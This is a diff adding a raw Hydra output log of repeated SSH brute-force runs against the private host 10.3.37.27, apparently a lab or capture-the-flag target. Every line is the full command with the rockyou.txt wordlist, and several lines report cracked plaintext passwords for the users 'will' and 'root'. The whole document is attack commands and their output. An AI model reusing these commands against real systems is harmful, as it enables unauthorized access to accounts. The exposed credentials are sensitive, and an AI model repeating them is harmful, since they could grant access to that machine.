@@ -1,0 +1,20 @@
+# Hydra v9.3 run at 2022-03-07 13:15:43 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -I -o output.txt 10.3.37.27 ssh)
+[22][ssh] host: 10.3.37.27   login: will   password: Lucy!@#!@#!@#
+# Hydra v9.3 run at 2022-03-07 13:16:36 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -t 16 -o output.txt -I ssh://10.3.37.27)
+[22][ssh] host: 10.3.37.27   login: will   password: Lucy!@#!@#!@#
+# Hydra v9.3 run at 2022-03-07 13:16:46 on 10.3.37.27 ssh (hydra -l root -P rockyou.txt -vV -t 16 -o output.txt -I ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-07 13:17:39 on 10.3.37.27 ssh (hydra -R)
+# Hydra v9.3 run at 2022-03-07 13:17:57 on 10.3.37.27 ssh (hydra -l root -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-07 13:19:18 on 10.3.37.27 ssh (hydra -l root -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+[22][ssh] host: 10.3.37.27   login: root   password: Cmonster2006
+# Hydra v9.3 run at 2022-03-07 13:20:10 on 10.3.37.27 ssh (hydra -l root -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-07 13:22:00 on 10.3.37.27 ssh (hydra -l root -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-07 13:22:24 on 10.3.37.27 ssh (hydra -l root -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+[22][ssh] host: 10.3.37.27   login: root   password: Cmonster2006
+# Hydra v9.3 run at 2022-03-07 13:40:33 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+[22][ssh] host: 10.3.37.27   login: will   password: Lucy!@#!@#!@#
+# Hydra v9.3 run at 2022-03-07 13:47:40 on 10.3.37.27 ssh (hydra -l will -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+[22][ssh] host: 10.3.37.27   login: will   password: Lucy!@#!@#!@#
+# Hydra v9.3 run at 2022-03-07 13:48:26 on bahsy ssh (hydra -l bashy -P rockyou.txt -vV -t 64 -o output.txt -I ssh://bahsy)
+# Hydra v9.3 run at 2022-03-07 13:48:38 on 10.3.37.27 ssh (hydra -l 10.3.37.27 -P rockyou.txt -vV -t 64 -o output.txt -I ssh://10.3.37.27)
+# Hydra v9.3 run at 2022-03-07 13:49:29 on 10.3.37.27 ssh (hydra -l 10.3.37.27 -P rockyou.txt -vV -o output.txt -I ssh://10.3.37.27)
